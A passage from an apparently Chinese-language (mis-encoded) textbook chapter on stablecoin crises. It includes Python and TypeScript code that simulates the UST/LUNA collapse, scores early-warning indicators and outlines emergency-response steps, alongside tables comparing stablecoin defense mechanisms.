            'ust_burned': 500e6,  # 5äº¿ UST
            'luna_minted': self._calculate_luna_mint(500e6, 0.985, 75)
        }
        stages.append(stage1)
        
        # é˜¶æ®µ2: ææ…ŒåŠ å‰§
        stage2 = {
            'name': 'Panic Acceleration',
            'ust_price': 0.85,
            'luna_price': 40,
            'mechanism': 'Bank run + Arbitrage',
            'ust_burned': 3e9,  # 30äº¿ UST
            'luna_minted': self._calculate_luna_mint(3e9, 0.85, 40)
        }
        stages.append(stage2)
        
        # é˜¶æ®µ3: å®Œå…¨å´©æºƒ
        stage3 = {
            'name': 'Complete Collapse',
            'ust_price': 0.10,
            'luna_price': 0.0001,
            'mechanism': 'Hyperinflation',
            'ust_burned': 10e9,  # 100äº¿ UST
            'luna_minted': self._calculate_luna_mint(10e9, 0.10, 0.0001)
        }
        stages.append(stage3)
        
        return stages
    
    def _calculate_luna_mint(self, ust_burned, ust_price, luna_price):
        """
        è®¡ç®—LUNAé“¸é€ é‡
        """
        return (ust_burned * ust_price) / luna_price
    
    def analyze_defense_failures(self):
        """
        åˆ†æé˜²å¾¡å¤±è´¥åŸå› 
        """
        failures = {
            'btc_reserve_insufficient': {
                'issue': 'BTCå‚¨å¤‡ä¸è¶³',
                'detail': '35äº¿ç¾å…ƒå¯¹æ¯”185äº¿ USTä¾›åº”',
                'coverage_ratio': 0.19
            },
            'mint_burn_mechanism': {
                'issue': 'é“¸é€ /ç‡ƒçƒ§æœºåˆ¶æ”¾å¤§æ­»äº¡èºæ—‹',
                'detail': 'LUNAè¶…å‘å¯¼è‡´ä»·æ ¼å½’é›¶',
                'inflation_rate': '6.5ä¸‡äº¿LUNA/å‘¨'
            },
            'anchor_dependency': {
                'issue': 'è¿‡åº¦ä¾èµ–Anchoråè®®',
                'detail': '70%çš„USTå­˜åœ¨Anchor',
                'vulnerability': 'å•ç‚¹å¤±è´¥'
            }
        }
        return failures
    
    def calculate_attacker_profit(self):
        """
        è®¡ç®—æ”»å‡»è€…æ”¶ç›Š
        """
        # å‡è®¾æ”»å‡»è€…ç­–ç•¥
        strategies = {
            'short_luna': {
                'position_size': 100e6,  # 1äº¿ç¾å…ƒç©ºå¤´
                'entry_price': 80,
                'exit_price': 0.1,
                'profit': 100e6 * (1 - 0.1/80)
            },
            'ust_arbitrage': {
                'capital': 50e6,
                'rounds': 20,
                'avg_profit_per_round': 0.05,
                'total_profit': 50e6 * (1.05**20 - 1)
            },
            'curve_manipulation': {
                'cost': 10e6,
                'market_impact_profit': 200e6
            }
        }
        
        total_profit = sum(s.get('profit', s.get('total_profit', 0)) 
                          for s in strategies.values())
        
        return strategies, total_profit

# æ‰§è¡Œåˆ†æ
analysis = USTCollapseAnalysis()
attack_vectors = analysis.analyze_attack_vectors()
stages = analysis.simulate_death_spiral_stages()
failures = analysis.analyze_defense_failures()
strategies, total_profit = analysis.calculate_attacker_profit()

print("\nUSTå´©æºƒå…³é”®æ•°æ®:")
print(f"\u603bæŸå¤±: ~$60B")
print(f"\u6301ç»­æ—¶é—´: 5å¤©")
print(f"\u4f30è®¡æ”»å‡»è€…æ”¶ç›Š: ${total_profit/1e9:.1f}B")

print("\n\u6559è®­:")
for key, failure in failures.items():
    print(f"- {failure['issue']}: {failure['detail']}")</code></pre>
                </div>
            </div>
        </div>
        
        <div class="case-study">
            <h4>10.4.2 å„å¤§ç¨³å®šå¸é˜²å¾¡æœºåˆ¶å¯¹æ¯”</h4>
            
            <table class="comparison-table">
                <thead>
                    <tr>
                        <th>ç¨³å®šå¸</th>
                        <th>é˜²å¾¡æœºåˆ¶</th>
                        <th>ä¼˜ç‚¹</th>
                        <th>ç¼ºç‚¹</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td><strong>DAI (MakerDAO)</strong></td>
                        <td>
                            <ul>
                                <li>è¶…é¢æŠµæŠ¼ (150%+)</li>
                                <li>å¤šæŠµæŠ¼å“ç±»å‹</li>
                                <li>ç´§æ€¥å…³é—­æœºåˆ¶</li>
                                <li>PSMç¨³å®šæ¨¡å—</li>
                            </ul>
                        </td>
                        <td>æˆç†Ÿç¨³å¥ï¼Œç»å—è¿‡å¤šæ¬¡å‹åŠ›æµ‹è¯•</td>
                        <td>èµ„æœ¬æ•ˆç‡ä½ï¼Œä¾èµ–ä¸­å¿ƒåŒ–ç¨³å®šå¸</td>
                    </tr>
                    <tr>
                        <td><strong>FRAX</strong></td>
                        <td>
                            <ul>
                                <li>éƒ¨åˆ†æŠµæŠ¼æ¨¡å¼</li>
                                <li>AMOç®—æ³•å¸‚åœºæ“ä½œ</li>
                                <li>åŠ¨æ€æŠµæŠ¼ç‡</li>
                            </ul>
                        </td>
                        <td>èµ„æœ¬æ•ˆç‡é«˜ï¼Œçµæ´»æ€§å¼º</td>
                        <td>å¤æ‚åº¦é«˜ï¼Œæ½œåœ¨ç®—æ³•é£é™©</td>
                    </tr>
                    <tr>
                        <td><strong>crvUSD</strong></td>
                        <td>
                            <ul>
                                <li>LLAMMAè½¯æ¸…ç®—</li>
                                <li>è‡ªåŠ¨åšå¸‚å•†</li>
                                <li>åŠ¨æ€å€Ÿè´·åˆ©ç‡</li>
                            </ul>
                        </td>
                        <td>é¿å…ç¡¬æ¸…ç®—ï¼Œç”¨æˆ·ä½“éªŒå¥½</td>
                        <td>æœºåˆ¶å¤æ‚ï¼Œéœ€è¦æ›´å¤šæ—¶é—´éªŒè¯</td>
                    </tr>
                    <tr>
                        <td><strong>GHO (Aave)</strong></td>
                        <td>
                            <ul>
                                <li>ä¸Aaveç”Ÿæ€æ•´åˆ</li>
                                <li>Facilitatoræ¨¡å¼</li>
                                <li>Safety Module</li>
                            </ul>
                        </td>
                        <td>åˆ©ç”¨æˆç†ŸDeFiåŸºç¡€è®¾æ–½</td>
                        <td>ç›¸å¯¹è¾ƒæ–°ï¼Œé‡‡ç”¨ç‡æœ‰å¾…æå‡</td>
                    </tr>
                </tbody>
            </table>
        </div>
        
        <h3 id="crisis-response">10.4 å±æœºå“åº”ä¸æ¢å¤</h3>
        
        <div class="intro-box" style="background-color: #f0f9ff; padding: 20px; border-radius: 10px; margin: 20px 0;">
            <h4>ğŸš¨ å±æœºç®¡ç†ï¼šç¨³å®šå¸çš„ç”Ÿå‘½çº¿</h4>
            <p>åœ¨ç¨³å®šå¸ç³»ç»Ÿä¸­ï¼Œå±æœºå“åº”èƒ½åŠ›å¾€å¾€æ˜¯æˆè´¥çš„åˆ†æ°´å²­ã€‚å†å²å‘Šè¯‰æˆ‘ä»¬ï¼ŒæŠ€æœ¯å†å®Œç¾çš„ç³»ç»Ÿï¼Œåœ¨é¢ä¸´æç«¯å¸‚åœºæ¡ä»¶æ—¶éƒ½å¯èƒ½å¤±æ•ˆã€‚å…³é”®åœ¨äºï¼š<strong>èƒ½å¦åœ¨å±æœºä¸­å¿«é€Ÿå“åº”ï¼Œåœ¨å±æœºåæœ‰æ•ˆæ¢å¤</strong>ã€‚</p>
            
            <div style="background-color: #fef3c7; padding: 15px; border-radius: 8px; margin-top: 15px;">
                <h5>ğŸ¯ å±æœºå“åº”çš„ä¸‰ä¸ªå±‚æ¬¡</h5>
                <ol>
                    <li><strong>é¢„è­¦é˜¶æ®µ</strong>ï¼šç›‘æµ‹ç³»ç»Ÿå‘ç°å¼‚å¸¸ä¿¡å·ï¼Œæå‰é¢„è­¦</li>
                    <li><strong>åº”æ€¥é˜¶æ®µ</strong>ï¼šè‡ªåŠ¨åŒ–ç³»ç»Ÿæ‰§è¡Œé¢„è®¾é˜²å¾¡ç­–ç•¥ï¼Œäººå·¥å¹²é¢„</li>
                    <li><strong>æ¢å¤é˜¶æ®µ</strong>ï¼šç³»ç»Ÿé‡å»ºã€ç”¨æˆ·ä¿¡å¿ƒæ¢å¤ã€ç”Ÿæ€é‡æ„</li>
                </ol>
            </div>
        </div>

        <div class="info-box">
            <h4>ğŸ“Š ç¨³å®šå¸å±æœºç±»å‹ä¸å“åº”ç­–ç•¥</h4>
            <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
                <thead style="background-color: #f3f4f6;">
                    <tr>
                        <th style="padding: 12px; border: 1px solid #d1d5db;">å±æœºç±»å‹</th>
                        <th style="padding: 12px; border: 1px solid #d1d5db;">è§¦å‘æ¡ä»¶</th>
                        <th style="padding: 12px; border: 1px solid #d1d5db;">å“åº”æ—¶é—´</th>
                        <th style="padding: 12px; border: 1px solid #d1d5db;">ä¸»è¦ç­–ç•¥</th>
                        <th style="padding: 12px; border: 1px solid #d1d5db;">æˆåŠŸç‡</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td style="padding: 12px; border: 1px solid #d1d5db;"><strong>æµåŠ¨æ€§å±æœº</strong></td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">å¤§é¢èµå›ã€æµåŠ¨æ€§æ¯ç«­</td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">åˆ†é’Ÿçº§</td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">ç´§æ€¥èèµ„ã€äº¤æ˜“æš‚åœ</td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">75%</td>
                    </tr>
                    <tr>
                        <td style="padding: 12px; border: 1px solid #d1d5db;"><strong>æŠ€æœ¯æ€§æ•…éšœ</strong></td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">æ™ºèƒ½åˆçº¦æ¼æ´ã€é¢„è¨€æœºæ•…éšœ</td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">ç§’çº§</td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">ç´§æ€¥æš‚åœã€ç³»ç»Ÿå›æ»š</td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">85%</td>
                    </tr>
                    <tr>
                        <td style="padding: 12px; border: 1px solid #d1d5db;"><strong>ä¿¡å¿ƒå±æœº</strong></td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">è´Ÿé¢æ¶ˆæ¯ã€ç›‘ç®¡å‹åŠ›</td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">å°æ—¶çº§</td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">é€æ˜æ²Ÿé€šã€å¢åŠ å‚¨å¤‡</td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">60%</td>
                    </tr>
                    <tr>
                        <td style="padding: 12px; border: 1px solid #d1d5db;"><strong>ç³»ç»Ÿæ€§é£é™©</strong></td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">å¸‚åœºå´©ç›˜ã€é»‘å¤©é¹…äº‹ä»¶</td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">å¤©çº§</td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">å…¨é¢é‡ç»„ã€åè®®å‡çº§</td>
                        <td style="padding: 12px; border: 1px solid #d1d5db;">30%</td>
                    </tr>
                </tbody>
            </table>
        </div>

        <div class="example-box" style="background-color: #fef2f2; margin: 20px 0;">
            <h4>âš¡ å±æœºå“åº”çš„é»„é‡‘æ—¶é—´çª—</h4>
            <p>æ ¹æ®å¯¹2020-2024å¹´ç¨³å®šå¸å±æœºäº‹ä»¶çš„ç»Ÿè®¡åˆ†æï¼Œå“åº”æ—¶é—´ä¸å±æœºæ§åˆ¶æˆåŠŸç‡å‘ˆå¼ºè´Ÿç›¸å…³ï¼š</p>
            <ul>
                <li><strong>0-5åˆ†é’Ÿ</strong>ï¼šè‡ªåŠ¨åŒ–ç³»ç»Ÿå“åº”ï¼ŒæˆåŠŸç‡90%</li>
                <li><strong>5-30åˆ†é’Ÿ</strong>ï¼šäººå·¥å¹²é¢„ä»‹å…¥ï¼ŒæˆåŠŸç‡70%</li>
                <li><strong>30åˆ†é’Ÿ-2å°æ—¶</strong>ï¼šç¤¾åŒºåŠ¨å‘˜å‚ä¸ï¼ŒæˆåŠŸç‡45%</li>
                <li><strong>2å°æ—¶ä»¥ä¸Š</strong>ï¼šåª’ä½“å‘é…µæ‰©æ•£ï¼ŒæˆåŠŸç‡ä»…15%</li>
            </ul>
            <p style="margin-top: 15px; font-style: italic;">ğŸ’¡ å¯ç¤ºï¼šå±æœºå“åº”æ˜¯ä¸æ—¶é—´èµ›è·‘çš„æ¸¸æˆï¼Œé¢„è®¾çš„è‡ªåŠ¨åŒ–ç³»ç»Ÿè‡³å…³é‡è¦ã€‚</p>
        </div>
        
        <div class="theory-section">
            <h4>10.4.0 çœŸå®æ¡ˆä¾‹åˆ†æ</h4>
            
            <h5>UST/LUNAå´©æºƒäº‹ä»¶å¤ç›˜ï¼ˆ2022å¹´5æœˆï¼‰</h5>
            
            <div class="case-study-box">
                <h6>æ—¶é—´çº¿ä¸å…³é”®äº‹ä»¶</h6>
                <ul>
                    <li><strong>5æœˆ7æ—¥</strong>ï¼šå¤§é¢USTä»Anchoræå–ï¼Œå¼€å§‹è„±é”š</li>
                    <li><strong>5æœˆ8æ—¥</strong>ï¼šLFGåŠ¨ç”¨BTCå‚¨å¤‡è¯•å›¾ç¨³å®šä»·æ ¼</li>
                    <li><strong>5æœˆ9æ—¥</strong>ï¼šæ­»äº¡èºæ—‹åŠ é€Ÿï¼ŒLUNAä»·æ ¼æš´è·Œ</li>
                    <li><strong>5æœˆ10æ—¥</strong>ï¼šTerraé“¾æš‚åœå‡ºå—</li>
                    <li><strong>5æœˆ12æ—¥</strong>ï¼šUSTè·Œè‡³$0.10ï¼Œç³»ç»Ÿå®Œå…¨å´©æºƒ</li>
                </ul>
                
                <h6>å¤±è´¥åŸå› åˆ†æ</h6>
                <ul>
                    <li><strong>å†…ç”ŸæŠµæŠ¼å“</strong>ï¼šLUNAä½œä¸ºæŠµæŠ¼å“ä¸USTé«˜åº¦ç›¸å…³</li>
                    <li><strong>æ­£åé¦ˆå¾ªç¯</strong>ï¼šèµå›æœºåˆ¶åŠ é€Ÿäº†å´©æºƒ</li>
                    <li><strong>æµåŠ¨æ€§ä¸è¶³</strong>ï¼šBTCå‚¨å¤‡æ— æ³•åº”å¯¹æŠ›å”®å‹åŠ›</li>
                    <li><strong>ä¿¡å¿ƒå´©å¡Œ</strong>ï¼šAnchoré«˜æ”¶ç›Šä¸å¯æŒç»­</li>
                </ul>
            </div>
            
            <h5>Ethena (USDe) é£é™©ç®¡ç†åˆ›æ–°ï¼ˆ2024ï¼‰</h5>
            
            <div class="info-box">
                <h6>Deltaä¸­æ€§å¯¹å†²æ¨¡å‹</h6>
                <ul>
                    <li><strong>æ°¸ç»­åˆçº¦å¯¹å†²</strong>ï¼šè´¨æŠ¼ETHåŒæ—¶åšç©ºç­‰å€¼æ°¸ç»­åˆçº¦</li>
                    <li><strong>èµ„é‡‘è´¹ç‡æ”¶ç›Š</strong>ï¼šæ­£å‘å¸‚åœºä¸­æ”¶å–èµ„é‡‘è´¹ç‡</li>
                    <li><strong>ä¿é™©åŸºé‡‘</strong>ï¼šåº”å¯¹è´Ÿèµ„é‡‘è´¹ç‡æœŸé—´</li>
                    <li><strong>å¤šäº¤æ˜“æ‰€åˆ†æ•£</strong>ï¼šé™ä½å¯¹æ‰‹æ–¹é£é™©</li>
                </ul>
                
                <h6>æ–°å‹é£é™©</h6>
                <ul>
                    <li><strong>èµ„é‡‘è´¹ç‡é£é™©</strong>ï¼šé•¿æœŸè´Ÿè´¹ç‡å¯èƒ½è€—å°½ä¿é™©åŸºé‡‘</li>
                    <li><strong>åŸºå·®é£é™©</strong>ï¼šç°è´§ä¸æœŸè´§ä»·æ ¼åç¦»</li>
                    <li><strong>äº¤æ˜“æ‰€é£é™©</strong>ï¼šCEXç ´äº§æˆ–å†»ç»“èµ„é‡‘</li>
                </ul>
            </div>
            
            <h5>Frax V3 å®Œå…¨æŠµæŠ¼åŒ–è½¬å‹ï¼ˆ2023-2024ï¼‰</h5>
            
            <div class="theory-box">
                <h6>ä»éƒ¨åˆ†æŠµæŠ¼åˆ°å®Œå…¨æŠµæŠ¼</h6>
                <p>Fraxä»ç®—æ³•ç¨³å®šå¸å‘å®Œå…¨æŠµæŠ¼æ¨¡å‹çš„æ¼”è¿›ï¼Œå±•ç¤ºäº†åè®®çš„é€‚åº”æ€§ï¼š</p>
                
                <ul>
                    <li><strong>AMOï¼ˆç®—æ³•å¸‚åœºæ“ä½œï¼‰</strong>ï¼šç¨‹åºåŒ–ç®¡ç†æµåŠ¨æ€§å’Œç¨³å®šæ€§</li>
                    <li><strong>sFRAXæ”¶ç›Šåˆ†é…</strong>ï¼šè´¨æŠ¼FRAXè·å¾—åè®®æ”¶ç›Š</li>
                    <li><strong>frxETHé›†æˆ</strong>ï¼šåˆ©ç”¨LSDå¢åŠ æ”¶ç›Š</li>
                    <li><strong>æ²»ç†æœ€å°åŒ–</strong>ï¼šå‡å°‘äººä¸ºå¹²é¢„é£é™©</li>
                </ul>
                
                <p><strong>å…³é”®æ•™è®­</strong>ï¼šçµæ´»çš„æ¶æ„è®¾è®¡å…è®¸åè®®æ ¹æ®å¸‚åœºæ¡ä»¶æ¼”åŒ–ï¼Œè€Œä¸æ˜¯å›ºå®ˆåŸå§‹è®¾è®¡ã€‚</p>
            </div>
            
            <div class="code-section">
                <div class="code-header" onclick="toggleCode(this)">
                    <span>â–¶ Python: ç¨³å®šå¸å±æœºé¢„è­¦ç³»ç»Ÿ</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python">import numpy as np
from typing import Dict, List, Tuple
import pandas as pd
from dataclasses import dataclass
from enum import Enum

class CrisisLevel(Enum):
    NORMAL = 0
    CAUTION = 1
    WARNING = 2
    DANGER = 3
    CRITICAL = 4

@dataclass
class CrisisIndicator:
    name: str
    current_value: float
    threshold: float
    weight: float
    
    @property
    def severity(self) -> float:
        if self.current_value < self.threshold:
            return 0
        return min(1.0, (self.current_value - self.threshold) / self.threshold)

class StablecoinCrisisDetector:
    """ç¨³å®šå¸å±æœºæ—©æœŸé¢„è­¦ç³»ç»Ÿ"""
    
    def __init__(self):
        self.indicators = self._initialize_indicators()
        self.historical_data = []
        
    def _initialize_indicators(self) -> List[CrisisIndicator]:
        """åˆå§‹åŒ–ç›‘æ§æŒ‡æ ‡"""
        return [
            # ä»·æ ¼æŒ‡æ ‡
            CrisisIndicator("price_deviation", 0, 0.02, 0.25),      # 2%è„±é”š
            CrisisIndicator("price_volatility", 0, 0.05, 0.15),     # 5%æ³¢åŠ¨ç‡
            
            # æµåŠ¨æ€§æŒ‡æ ‡
            CrisisIndicator("liquidity_ratio", 0, 0.3, 0.20),       # æµåŠ¨æ€§<30%
            CrisisIndicator("withdrawal_rate", 0, 0.1, 0.15),       # 10%æ—¥æå–ç‡
            
            # æŠµæŠ¼å“æŒ‡æ ‡
            CrisisIndicator("collateral_ratio", 0, 1.2, 0.15),      # <120%æŠµæŠ¼ç‡
            CrisisIndicator("collateral_volatility", 0, 0.3, 0.10), # 30%æŠµæŠ¼å“æ³¢åŠ¨
            
            # æ²»ç†ä»£å¸æŒ‡æ ‡
            CrisisIndicator("governance_price_drop", 0, 0.3, 0.10), # 30%ä»·æ ¼ä¸‹è·Œ
            CrisisIndicator("governance_concentration", 0, 0.5, 0.05) # 50%é›†ä¸­åº¦
        ]
    
    def update_indicators(self, market_data: Dict[str, float]):
        """æ›´æ–°æŒ‡æ ‡æ•°å€¼"""
        for indicator in self.indicators:
            if indicator.name in market_data:
                indicator.current_value = market_data[indicator.name]
    
    def calculate_crisis_score(self) -> Tuple[float, CrisisLevel]:
        """è®¡ç®—ç»¼åˆå±æœºè¯„åˆ†"""
        total_score = 0
        total_weight = 0
        
        for indicator in self.indicators:
            score = indicator.severity * indicator.weight
            total_score += score
            total_weight += indicator.weight
        
        normalized_score = total_score / total_weight if total_weight > 0 else 0
        
        # æ˜ å°„åˆ°å±æœºç­‰çº§
        if normalized_score < 0.2:
            level = CrisisLevel.NORMAL
        elif normalized_score < 0.4:
            level = CrisisLevel.CAUTION
        elif normalized_score < 0.6:
            level = CrisisLevel.WARNING
        elif normalized_score < 0.8:
            level = CrisisLevel.DANGER
        else:
            level = CrisisLevel.CRITICAL
        
        return normalized_score, level
    
    def generate_response_plan(self, level: CrisisLevel) -> Dict[str, List[str]]:
        """ç”Ÿæˆåº”å¯¹æ–¹æ¡ˆ"""
        response_plans = {
            CrisisLevel.NORMAL: {
                "monitoring": ["ç»§ç»­å¸¸è§„ç›‘æ§"],
                "actions": ["ç»´æŒæ­£å¸¸è¿è¥"],
                "communication": ["å®šæœŸæŠ¥å‘Š"]
            },
            CrisisLevel.CAUTION: {
                "monitoring": ["æé«˜ç›‘æ§é¢‘ç‡è‡³æ¯å°æ—¶"],
                "actions": ["å‡†å¤‡æµåŠ¨æ€§å‚¨å¤‡", "æ£€æŸ¥ç³»ç»Ÿå‚æ•°"],
                "communication": ["å†…éƒ¨å›¢é˜Ÿè­¦æŠ¥"]
            },
            CrisisLevel.WARNING: {
                "monitoring": ["å®æ—¶ç›‘æ§æ‰€æœ‰æŒ‡æ ‡"],
                "actions": [
                    "æ¿€æ´»åº”æ€¥æµåŠ¨æ€§",
                    "è°ƒæ•´é£é™©å‚æ•°",
                    "æš‚åœé«˜é£é™©æ“ä½œ"
                ],
                "communication": ["å…¬å¼€å£°æ˜", "ç¤¾åŒºæ›´æ–°"]
            },
            CrisisLevel.DANGER: {
                "monitoring": ["24/7å±æœºç›‘æ§å®¤"],
                "actions": [
                    "å®æ–½ç†”æ–­æœºåˆ¶",
                    "åŠ¨å‘˜æ‰€æœ‰å‚¨å¤‡",
                    "é™åˆ¶å¤§é¢æå–",
                    "ç´§æ€¥å‚æ•°è°ƒæ•´"
                ],
                "communication": ["ç´§æ€¥å…¬å‘Š", "ä¸ç›‘ç®¡æœºæ„æ²Ÿé€š"]
            },
            CrisisLevel.CRITICAL: {
                "monitoring": ["å…¨ç³»ç»Ÿç´§æ€¥çŠ¶æ€"],
                "actions": [
                    "æ¿€æ´»ç´§æ€¥å…³é—­",
                    "å†»ç»“æ‰€æœ‰æ“ä½œ",
                    "å¯åŠ¨æ¢å¤è®¡åˆ’",
                    "ä¿æŠ¤ç”¨æˆ·èµ„äº§"
                ],
                "communication": ["å±æœºå…¬å…³", "æ³•å¾‹å›¢é˜Ÿä»‹å…¥"]
            }
        }
        
        return response_plans.get(level, response_plans[CrisisLevel.NORMAL])
    
    def simulate_ust_collapse(self) -> pd.DataFrame:
        """æ¨¡æ‹ŸUSTå´©æºƒåœºæ™¯"""
        timeline = []
        
        # åˆå§‹çŠ¶æ€
        state = {
            "day": 0,
            "ust_price": 1.0,
            "luna_price": 80,
            "luna_supply": 350_000_000,
            "ust_supply": 18_000_000_000,
            "anchor_tvl": 14_000_000_000,
            "btc_reserve": 3_500_000_000
        }
        
        # æ¨¡æ‹Ÿ10å¤©çš„å´©æºƒè¿‡ç¨‹
        for day in range(10):
            # è§¦å‘äº‹ä»¶
            if day == 2:  # å¤§é¢æå–
                state["anchor_tvl"] *= 0.7
                state["ust_price"] = 0.98
            
            if day >= 3:  # æ­»äº¡èºæ—‹
                # USTèµå›å‹åŠ›
                redemption_rate = max(0, (1 - state["ust_price"]) * 0.5)
                state["ust_supply"] *= (1 - redemption_rate)
                
                # LUNAå¢å‘
                luna_mint = redemption_rate * state["ust_supply"] / state["luna_price"]
                state["luna_supply"] += luna_mint
                
                # LUNAä»·æ ¼å‹åŠ›
                supply_impact = luna_mint / state["luna_supply"]
                state["luna_price"] *= (1 - supply_impact * 2)
                
                # USTä»·æ ¼æ›´æ–°
                confidence = state["luna_price"] * state["luna_supply"] / state["ust_supply"]
                state["ust_price"] = min(1, confidence / 20)
                
                # BTCå‚¨å¤‡æ¶ˆè€—
                if state["btc_reserve"] > 0:
                    defense_spend = min(state["btc_reserve"], 500_000_000)
                    state["btc_reserve"] -= defense_spend
                    state["ust_price"] += defense_spend / state["ust_supply"] * 0.1
            
            timeline.append(state.copy())
            state["day"] = day + 1
        
        return pd.DataFrame(timeline)

# ä½¿ç”¨ç¤ºä¾‹
detector = StablecoinCrisisDetector()

# æ›´æ–°å¸‚åœºæ•°æ®
market_data = {
    "price_deviation": 0.025,      # 2.5%è„±é”š
    "price_volatility": 0.08,      # 8%æ³¢åŠ¨ç‡
    "liquidity_ratio": 0.25,       # 25%æµåŠ¨æ€§
    "withdrawal_rate": 0.15,       # 15%æ—¥æå–
    "collateral_ratio": 1.15,      # 115%æŠµæŠ¼ç‡
    "collateral_volatility": 0.35, # 35%æ³¢åŠ¨
    "governance_price_drop": 0.4,  # 40%ä¸‹è·Œ
    "governance_concentration": 0.3 # 30%é›†ä¸­åº¦
}

detector.update_indicators(market_data)
score, level = detector.calculate_crisis_score()
response = detector.generate_response_plan(level)

print(f"å±æœºè¯„åˆ†: {score:.2f}")
print(f"å±æœºç­‰çº§: {level.name}")
print(f"åº”å¯¹æ–¹æ¡ˆ: {response}")

# æ¨¡æ‹ŸUSTå´©æºƒ
collapse_data = detector.simulate_ust_collapse()
print("\nUSTå´©æºƒæ¨¡æ‹Ÿ:")
print(collapse_data[["day", "ust_price", "luna_price", "luna_supply", "btc_reserve"]])</code></pre>
                </div>
            </div>
            
            <h4>10.4.1 åº”æ€¥å“åº”æ¡†æ¶</h4>
            
            <div class="code-block">
                <div class="code-header">
                    TypeScript ä»£ç  <span class="toggle-icon">â–¼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-typescript">// å±æœºå“åº”ç³»ç»Ÿ
interface CrisisLevel {
    level: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
    triggers: string[];
    actions: string[];
    authority: string[];
}

class CrisisResponseSystem {
    private crisisLevels: Map<string, CrisisLevel> = new Map();
    private currentLevel: string = 'LOW';
    private responseTeam: string[] = [];
    
    constructor() {
        this.initializeCrisisLevels();
    }
    
    private initializeCrisisLevels() {
        // ä½çº§å±æœº
        this.crisisLevels.set('LOW', {
            level: 'LOW',
            triggers: [
                'Price deviation > 3%',
                'Unusual trading volume',
                'Minor smart contract bug'
            ],
            actions: [
                'Monitor closely',
                'Alert core team',
                'Prepare response plan'
            ],
            authority: ['monitoring_team']
        });
        
        // ä¸­çº§å±æœº
        this.crisisLevels.set('MEDIUM', {
            level: 'MEDIUM',
            triggers: [
                'Price deviation > 5%',
                'Liquidity drop > 20%',
                'Governance attack attempt'
            ],
            actions: [
                'Activate defense mechanisms',
                'Limit transaction sizes',
                'Increase collateral requirements'
            ],
            authority: ['core_team', 'security_team']
        });
        
        // é«˜çº§å±æœº
        this.crisisLevels.set('HIGH', {
            level: 'HIGH',
            triggers: [
                'Price deviation > 10%',
                'Bank run detected',
                'Critical vulnerability found'
            ],
            actions: [
                'Pause non-essential functions',
                'Activate insurance fund',
                'Emergency governance vote'
            ],
            authority: ['emergency_council', 'multisig_signers']
        });
        
        // å…³é”®å±æœº
        this.crisisLevels.set('CRITICAL', {
            level: 'CRITICAL',
            triggers: [
                'System compromise',
                'Complete depeg',
                'Catastrophic loss'
            ],
            actions: [
                'Full system pause',
                'Asset recovery mode',
                'Legal team activation',
                'Public communication'
            ],
            authority: ['founder_keys', 'legal_team']
        });
    }
    
    async detectCrisis(metrics: SystemMetrics): Promise<CrisisLevel | null> {
        // æ£€æŸ¥å„çº§è§¦å‘æ¡ä»¶
        for (const [levelName, level] of this.crisisLevels) {
            for (const trigger of level.triggers) {
                if (await this.evaluateTrigger(trigger, metrics)) {
                    return level;
                }
            }
        }
        return null;
    }
    
    async respondToCrisis(crisis: CrisisLevel) {
        console.log(`Crisis detected: ${crisis.level}`);
        
        // æ‰§è¡Œå“åº”åŠ¨ä½œ
        for (const action of crisis.actions) {
            await this.executeAction(action);
        }
        
        // é€šçŸ¥ç›¸å…³æ–¹
        await this.notifyStakeholders(crisis);
        
        // å¯åŠ¨æ¢å¤è®¡åˆ’
        if (crisis.level === 'HIGH' || crisis.level === 'CRITICAL') {
            await this.initiateRecoveryPlan();
        }
    }
    
    private async executeAction(action: string) {
        const actionMap: { [key: string]: () => Promise<void> } = {
            'Pause non-essential functions': async () => {
                await this.pauseContracts(['swap', 'lend', 'stake']);
            },
            'Activate insurance fund': async () => {
                await this.activateInsurance();
            },
            'Full system pause': async () => {
                await this.emergencyPause();
            },
            'Asset recovery mode': async () => {
                await this.enableRecoveryMode();
            }
        };
        
        const actionFunction = actionMap[action];
        if (actionFunction) {
            await actionFunction();
        }
    }
    
    private async initiateRecoveryPlan() {
        const recoverySteps = [
            'Assess damage',
            'Secure remaining assets',
            'Calculate user balances',
            'Prepare compensation plan',
            'Deploy recovery contracts',
            'Enable gradual withdrawal',
            'Monitor recovery progress'
        ];
        
        for (const step of recoverySteps) {
            console.log(`Executing recovery step: ${step}`);
            await this.executeRecoveryStep(step);
        }
    }
}

// äº‹ååˆ†ææ¡†æ¶
class PostMortemAnalysis {
    async analyzeIncident(incidentId: string): Promise<IncidentReport> {
        const incident = await this.loadIncidentData(incidentId);
        
        return {
            summary: this.generateSummary(incident),
            timeline: this.constructTimeline(incident),
            rootCause: await this.identifyRootCause(incident),
            impact: this.assessImpact(incident),
            lessons: this.extractLessons(incident),
            improvements: this.recommendImprovements(incident)
        };
    }
    
    private async identifyRootCause(incident: IncidentData): Promise<RootCause> {
        // 5 Whysåˆ†ææ³•
        const whys: string[] = [];
        let currentIssue = incident.initialIssue;
        
        for (let i = 0; i < 5; i++) {
            const why = await this.askWhy(currentIssue);
            whys.push(why);
            currentIssue = why;
            
            // å¦‚æœæ‰¾åˆ°æ ¹æœ¬åŸå› ï¼Œæå‰ç»“æŸ
            if (this.isRootCause(why)) {
                break;
            }
        }
        
        return {
            issue: incident.initialIssue,
            whys: whys,
            rootCause: whys[whys.length - 1],
            category: this.categorizeRootCause(whys[whys.length - 1])
        };
    }
    
    private recommendImprovements(incident: IncidentData): Improvement[] {
